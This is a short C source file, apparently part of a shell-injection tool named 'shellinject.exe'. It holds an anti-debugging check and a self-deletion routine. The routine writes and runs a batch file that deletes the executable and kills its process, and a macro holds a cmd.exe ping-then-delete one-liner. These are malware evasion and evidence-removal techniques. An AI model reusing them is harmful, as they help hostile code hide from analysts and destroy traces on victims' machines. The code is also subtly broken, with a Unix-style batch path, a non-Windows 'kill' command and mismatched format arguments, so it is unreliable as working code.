#include "DebugProtection.h"
//just for tests
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")

bool IsDebuggged() {

	if (IsDebuggerPresent()) {
		return true;
	}
	else {
		return false;
	}


}

// litel problem
void SelfDelete() {
    // Get the executable file path
    //wchar_t path[260];
    //GetModuleFileName(NULL, path, 260);

    int PID = get_pid(L"shellinject.exe");
    
    FILE* batchFile = fopen("delete.bat", "w");
    if (batchFile == NULL) {
        printf("Failed to create batch file.\n");
        return ;
    }

 /*   
    fprintf(batchFile,
        ":Repeat\n"
        "del \"%s\"\n"
        "kill %d \n"
        "if exist \"%s\" goto Repeat\n"
        "del delete.bat\n",
        PID,path, path);
        */

    fprintf(batchFile,
        ":Repeat\n"
        "del \"shellinject.exe\"\n"
        "kill %d \n"
        "if exist \"shellinject.exe\" goto Repeat\n"
        "del delete.bat\n",
        PID);

    fclose(batchFile);

    // Execute the batch file after the program finishes
    system("./delete.bat");

    printf("This program will delete itself.\n");

}